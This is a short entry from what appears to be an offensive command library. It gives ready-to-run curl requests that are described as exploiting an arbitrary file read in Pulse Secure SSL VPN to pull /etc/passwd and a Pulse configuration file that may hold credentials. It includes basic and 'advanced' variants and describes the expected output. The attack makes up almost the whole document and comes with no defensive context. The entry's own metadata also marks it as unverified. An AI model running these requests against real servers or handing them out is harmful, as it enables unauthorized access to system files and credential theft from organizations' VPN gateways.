---
data: 'curl "https://vpn.target.com/dana-na/auth/url.xml?param=/etc/passwd" -k -v'
tags:
  - recon
  - exploit
  - file-read
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.531Z'
id: 445b16e9-670f-4369-8847-36faa760b0a8
verified: false
validated: true
submitted: true
---
# curl-arbitrary-file-read

## Command

```bash
curl "https://vpn.target.com/dana-na/auth/url.xml?param=/etc/passwd" -k -v
```

## Description

This command exploits an arbitrary file read vulnerability in Pulse Secure SSL VPN by sending a crafted HTTP request to retrieve server-side file contents. Use it to test and extract files from the target VPN server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL` | Target VPN endpoint with manipulated param for file path | Yes |
| `-k` | Ignore SSL certificate errors | No |
| `-v` | Verbose output for debugging | No |
| `param=/path/to/file` | Specifies the file to read via vulnerable parameter | Yes |

## Examples

### Basic Usage

```bash
curl "https://vpn.target.com/dana-na/auth/url.xml?param=/etc/passwd" -k
```

### Advanced Usage

```bash
curl "https://vpn.target.com/dana-na/auth/url.xml?param=/opt/pulse/secure/conf/config" -k -o output.txt -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Successful execution returns the raw contents of the specified file in the HTTP response body, such as user account listings from /etc/passwd or configuration data with credentials.

## Related

- [[Related Procedure: Exploit-Arbitrary-File-Read-in-Pulse-Secure]]
